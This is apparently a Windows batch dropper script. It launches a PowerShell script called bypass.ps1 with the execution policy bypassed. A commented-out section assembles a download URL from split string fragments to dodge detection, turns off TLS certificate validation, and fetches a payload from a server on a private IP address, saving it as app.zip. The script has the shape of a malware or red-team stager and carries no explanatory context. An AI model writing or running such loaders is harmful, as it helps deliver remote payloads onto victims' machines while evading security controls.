@echo off
setlocal
powershell -ExecutionPolicy Bypass -File ".\bypass.ps1"

@REM :: URL of the file to download https://192.168.248.131:7443/direct/download/265129df-eb2d-4f4a-91d0-fd5a3a9cc429
@REM set rl1=h
@REM set rl2=tt
@REM set rl3=ps
@REM set rl4=://
@REM set rl5=192.
@REM set rl6=168.
@REM set rl7=248.
@REM set rl8=131:
@REM set rl9=7443
@REM set rl10=/direc
@REM set rl11=ct/download
@REM set rl12=/26512
@REM set rl13=9df-eb
@REM set r14=2d-4f4a
@REM set rl15=-91d0
@REM set rl16=-fd5a3
@REM set rl17=a9cc429

@REM set full_url=%rl1%%rl2%%rl3%%rl4%%rl5%%rl6%%rl7%%rl8%%rl9%%rl10%%rl11%%rl12%%rl13%%r14%%rl15%%rl16%%rl17%
@REM echo %full_url%
@REM :: Path where the file will be saved
@REM set OU=ap
@REM set TPUT=p.zip

@REM set full_output=%OU%%TPUT%
@REM echo %full_output%
@REM :: Download the file
@REM powershell -Command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null; Invoke-WebRequest -Uri %full_url%  -OutFile %full_output%"
@REM @REM powershell -Command "" 
@REM echo Download complete!
@REM endlocal

